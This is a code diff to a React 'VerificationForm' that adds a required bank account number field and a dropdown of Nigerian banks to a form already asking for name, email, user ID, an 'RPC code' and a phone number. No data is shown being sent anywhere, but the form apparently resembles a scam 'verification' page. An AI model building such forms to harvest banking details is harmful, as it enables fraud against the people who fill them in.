@@ -4,6 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useToast } from "@/hooks/use-toast";
 
 const VerificationForm = () => {
@@ -15,6 +16,8 @@ const VerificationForm = () => {
     userId: "",
     rpcCode: "",
     phoneNumber: "",
+    accountNumber: "",
+    bank: "",
   });
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -22,7 +25,7 @@ const VerificationForm = () => {
     
     // Basic validation
     if (!formData.fullName || !formData.email || !formData.userId || 
-        !formData.rpcCode || !formData.phoneNumber) {
+        !formData.rpcCode || !formData.phoneNumber || !formData.accountNumber || !formData.bank) {
       toast({
         title: "Missing Information",
         description: "Please fill in all fields.",
@@ -42,6 +45,32 @@ const VerificationForm = () => {
 
     navigate("/verification-details");
   };
+
+  const banks = [
+    "Moniepoint MFB",
+    "Opay",
+    "PalmPay",
+    "Kuda Bank",
+    "Access Bank",
+    "GTBank",
+    "First Bank",
+    "UBA",
+    "Zenith Bank",
+    "Fidelity Bank",
+    "Union Bank",
+    "Stanbic IBTC",
+    "Sterling Bank",
+    "Wema Bank",
+    "Polaris Bank",
+    "Ecobank",
+    "FCMB",
+    "Unity Bank",
+    "Keystone Bank",
+    "Jaiz Bank",
+    "VFD MFB",
+    "Sparkle",
+    "Carbon",
+  ];
 
   return (
     <div className="min-h-screen bg-background py-12 px-4">
@@ -114,6 +143,34 @@ const VerificationForm = () => {
                 placeholder="Enter your phone number"
                 className="bg-background"
               />
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="accountNumber">Account Number</Label>
+              <Input
+                id="accountNumber"
+                type="text"
+                value={formData.accountNumber}
+                onChange={(e) => setFormData({ ...formData, accountNumber: e.target.value })}
+                placeholder="Enter your account number"
+                className="bg-background"
+              />
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="bank">Select Bank</Label>
+              <Select value={formData.bank} onValueChange={(value) => setFormData({ ...formData, bank: value })}>
+                <SelectTrigger className="bg-background">
+                  <SelectValue placeholder="Choose your bank" />
+                </SelectTrigger>
+                <SelectContent className="bg-card border-border max-h-[300px]">
+                  {banks.map((bank) => (
+                    <SelectItem key={bank} value={bank} className="cursor-pointer">
+                      {bank}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
 
             <Button
